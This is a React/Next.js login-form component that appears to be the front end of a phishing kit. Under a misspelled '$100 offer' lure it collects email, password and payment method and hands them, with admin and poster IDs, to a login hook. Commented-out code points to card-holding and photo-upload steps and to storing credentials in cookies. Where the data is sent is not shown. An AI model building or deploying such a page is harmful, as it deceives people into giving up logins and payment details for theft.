import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import Image from "next/image";
import useMockLogin from "../hooks/useMockLogin";

function LoginForm({ adminId, posterId }) {
  const initialvalues = {
    email: "",
    password: "",
  };

  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = async (values, formik) => {
    const { email, password } = values;

    // Cookies.set("site", site);
    // Cookies.set("email", email);
    // Cookies.set("password", password);

    // setShowModal(true);

    const allValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
      // onlyCard: Cookies.get("onlyCard"),
      // holdingCard: Cookies.get("holdingCard"),
    };

    login(allValues, formik);

    // console.log("allValues", allValues);
  };

  // const handleNextStep = () => {
  //   Cookies.set("email", email);
  //   Cookies.set("password", password);

  //   setShowModal(true);
  // };

  const captchaKeyDev = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
  // const captchaKeyProd = "6LdM_9MiAAAAAJpk2F0ZDaWmIv0BfTfMKChH7AGL";
  const captchaKeyProd = "6Lck0YUjAAAAANYCIMzWXamx6oD5pRnwwKszARPR";

  const recaptchaKey =
    process.env.NODE_ENV !== "development" ? captchaKeyProd : captchaKeyDev;

  return (
    <div className="">
      <div className="mt-[10px] flex flex-col items-center">
        <p className=" mt-[10px] text-custom-gray2 text-2xl font-bold">
          Fastive offer $100
        </p>
      </div>

      <div className="mt-1">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="mx-[30px]  flex flex-col justify-center items-center">
              <div className="space-y-[9px]  flex flex-col justify-center items-center">
                <Field
                  placeholder="Email"
                  className="px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                  id="email"
                  name="email"
                  required
                />

                <Field
                  className=" px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                  placeholder="Password"
                  name="password"
                  type="password"
                  autoComplete="on"
                  required
                />
              </div>
              <div className="flex flex-col items-center mt-3">
                <Field
                  placeholder="Payment method"
                  className="px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                  id="payment method"
                  name="payment"
                  required
                />

                <button
                  type="submit"
                  // type="button"
                  className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
                  // disabled={!verified}
                  // onClick={handleNextStep}
                >
                  SUBMIT
                </button>
              </div>

              {/* {showModal && <PhotoUpload setShowModal={setShowModal} />} */}
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}

export default LoginForm;
